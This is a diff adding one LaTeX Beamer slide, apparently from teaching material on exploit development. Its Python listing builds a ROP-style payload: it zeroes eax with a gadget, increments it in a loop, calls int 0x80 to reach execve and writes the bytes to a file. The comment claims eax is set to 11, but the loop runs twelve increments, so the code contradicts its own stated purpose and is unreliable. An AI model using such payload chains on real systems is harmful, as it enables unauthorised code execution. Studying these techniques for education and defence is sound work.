@@ -1,0 +1,10 @@
+\frametitle{Generating the payload: Init eax, call syscall}
+    \begin{lstlisting}[style=code, language=python]
+p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
+for i in range(12):
+    p += pack('<I', inc_eax)
+p += pack('<I', int_80) # call interrupt
+print(str(p)[2:-1])
+with open('payload', 'wb') as file:
+    file.write(p)
+    \end{lstlisting}
